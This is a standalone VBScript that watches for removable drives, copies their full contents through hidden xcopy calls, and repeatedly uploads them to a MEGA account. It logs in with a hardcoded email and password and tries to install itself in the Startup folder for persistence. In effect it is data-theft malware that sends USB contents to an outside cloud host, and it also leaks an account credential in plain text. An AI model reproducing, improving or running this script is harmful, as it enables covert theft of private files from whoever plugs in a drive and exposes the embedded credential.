Option Explicit

Dim objFSO, objShell, strScriptPath, strDriveLetter, megaCmdDirectory, backupDirectory

strScriptPath = WScript.ScriptFullName

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

megaCmdDirectory = "C:\Mega\MEGAcmd"
backupDirectory = "C:\Mega\MEGAcmd\backup"

Sub CopyScriptToStartupFolder(strSourcePath)
    Dim strStartupFolder, strDestinationPath
    strStartupFolder = objShell.SpecialFolders("Startup")
    strDestinationPath = strStartupFolder & "\" & objFSO.GetFileName(strSourcePath)
    objFSO.CopyFile strSourcePath, strDestinationPath, True
    MsgBox "Script copied to Startup folder.", vbInformation
End Sub

Sub CopyContentsToBackup(strDriveLetter)
    Dim sourceFolder, destinationFolder
    sourceFolder = strDriveLetter & ":\"
    destinationFolder = backupDirectory & "\" & objFSO.GetDriveName(strDriveLetter) & "\"
    If Not objFSO.FolderExists(destinationFolder) Then
        objFSO.CreateFolder destinationFolder
        MsgBox "Backup folder created.", vbInformation
    End If
    objShell.Run "xcopy """ & sourceFolder & """ """ & destinationFolder & """ /E /Y", 0, True
    MsgBox "Contents copied to backup folder.", vbInformation
End Sub

Sub UploadToMega()
    If objFSO.FolderExists(backupDirectory) Then
        Dim cmdCommand
        cmdCommand = "cd /D " & megaCmdDirectory & " && mega-login foxit26036@irnini.com Bits@123 && mega-put """ & backupDirectory & """"
        objShell.Run "cmd.exe /c " & cmdCommand, 0, True
        MsgBox "Contents uploaded to Mega.", vbInformation
    End If
End Sub

Do
    Dim colDrives, objDrive
    Set colDrives = objFSO.Drives
    For Each objDrive In colDrives
        If objDrive.DriveType = 1 Then
            strDriveLetter = objDrive.DriveLetter
            If Not objFSO.FileExists(strScriptPath) Then
                CopyScriptToStartupFolder strScriptPath
            End If
            CopyContentsToBackup strDriveLetter
        End If
    Next
    UploadToMega
    WScript.Sleep 5000
Loop
